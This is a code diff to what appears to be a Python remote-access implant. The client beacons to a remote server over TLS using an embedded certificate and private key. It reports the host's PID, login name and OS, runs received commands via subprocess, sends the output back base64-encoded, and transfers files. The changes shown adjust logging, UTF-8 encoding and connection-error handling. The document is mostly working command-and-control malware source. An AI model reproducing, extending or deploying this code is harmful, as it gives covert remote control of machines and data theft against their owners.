@@ -4,7 +4,7 @@ import platform, ssl, subprocess
 from printlib import *
 from importlib import util
 from time import time, sleep
-from os import remove, path, getpid, kill, getlogin, name, chdir, getcwd
+from os import remove, path, getpid, kill, getlogin, name, chdir, getcwd, system
 from datetime import datetime
 from sys import exit,exc_info,argv
 from signal import SIGTERM
@@ -30,6 +30,7 @@ server_sni_hostname = ''
 VERBOSE = True
 DEBUG = True
 OUTPUT_FILE = True
+OUTPUT_FILE_DIR = getcwd()
 
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL_DEFAULT = 30    #in seconds
@@ -45,18 +46,23 @@ def get_time():
     return current_time
 
 def log_line(line):
-    with open("log","a+") as log_file:
-        log = get_time() + " " + line
-        log_file.write(log+"\n")
+    try:
+        with open(path.join(OUTPUT_FILE_DIR,"log"),"a+",encoding="utf8") as log_file:
+            log = get_time() + " " + line
+            log_file.write(log+"\n")
+    except Exception as e:
+        if DEBUG:
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            print_fail("Unable to Write Log File")
 
+log = "Current Working Directory: " + getcwd()
+chdir(path.dirname(argv[0]))
+OUTPUT_FILE_DIR = getcwd()
 if DEBUG:
-    #set working directory to script location
-    log = "Current Working Directory: " + getcwd()
     print(log)
     if OUTPUT_FILE:
         log_line(log)
-chdir(path.dirname(argv[0]))
-if DEBUG:
     log = "New Working Directory: " + getcwd()
     print(log)
     if OUTPUT_FILE:
@@ -71,8 +77,9 @@ except:
         print_warn(exc_info())
         
     if OUTPUT_FILE:
-        log_line(exc_info())
-        
+        log_line(str(exc_info()))
+
+system('chcp 65001')
 
 def create_keys():
     server_cert ='''\
@@ -108,7 +115,7 @@ H1fwfP6xGzn/UjUTNWuz
             if OUTPUT_FILE:       
                 log_line("Unable to create server key")
                 log_line(getcwd())
-                log_line(exc_info())
+                log_line(str(exc_info()))
                 
 
     client_cert = '''\
@@ -144,7 +151,7 @@ z/BKKDg5xkjlf0TAyaAo
             if OUTPUT_FILE:       
                 log_line("Unable to create client cert")
                 log_line(getcwd())
-                log_line(exc_info())
+                log_line(str(exc_info()))
     client_key= '''\
 -----BEGIN PRIVATE KEY-----
 MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClYnr6PZrghUhx
@@ -185,7 +192,7 @@ TZdCKivQ2PsE9Uw8BwCZYJI=
             if OUTPUT_FILE:       
                 log_line("Unable to create client key")
                 log_line(getcwd())
-                log_line(exc_info())
+                log_line(str(exc_info()))
 
 def push_uuid(conn):
     send_data(conn, UUID)
@@ -227,11 +234,11 @@ node: {}""".format(getpid(),getlogin(),date_time,platform.system(),platform.rele
 def base64_encode(message):
     try:
         if type(message) is not bytes:
-            message_bytes = message.encode('ascii')
+            message_bytes = message.encode('utf8')
         else:
-            message_bytes = message.decode().encode('ascii')
+            message_bytes = message.decode().encode('utf8')
         base64_bytes = base64.b64encode(message_bytes)
-        base64_message = base64_bytes.decode('ascii')
+        base64_message = base64_bytes.decode('utf8')
         return base64_message
     except Exception as e:
         if DEBUG:
@@ -248,8 +255,15 @@ def send_data(conn, plain_text):
     msg = plain_text
     try:
         base64_msg = base64_encode(msg + "[END]")
+        if DEBUG:
+            print("Sending:",base64_msg)
+            if OUTPUT_FILE:
+                log_line("Sending: {}".format(base64_msg))
         conn.send(base64_msg.encode('utf-8'))
-
+        if VERBOSE:
+            print_info("Sent:\n"  +plain_text)
+            if OUTPUT_FILE:
+                log_line("Sent:\n"  +plain_text)
     except Exception as e:
         if DEBUG:
             print(e)
@@ -259,10 +273,7 @@ def send_data(conn, plain_text):
                 log_line(e)       
                 log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                 log_line("Connection Interrupted - Unable to Send")
-    if VERBOSE:
-        print_info("Sent:\n"  +plain_text)
-        if OUTPUT_FILE:
-            log_line("Sent:\n"  +plain_text)
+    
 
 def file_transfer_get(conn, file_name):      #push to server - response from a 'get'
     filesize = path.getsize(file_name)
@@ -453,6 +464,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         get_cwd()
     except ConnectionRefusedError:
         raise ConnectionRefusedError
+    except ConnectionResetError:
+        raise ConnectionResetError
     except Exception as e:
         if DEBUG:
             print(e)
@@ -576,6 +589,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                         else:
                             try:
                                 send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                                #send_data(conn, output.stdout)#.decode('utf-8')) # send back the result
                             except UnicodeDecodeError:
                                 send_data(conn, output.stdout.decode('cp1251')) # send back the result
                                 if OUTPUT_FILE:
@@ -740,5 +754,5 @@ except:
         print(exc_info())
         print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         if OUTPUT_FILE:
-            log_line(exc_info())
+            log_line(str(exc_info()))
             log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
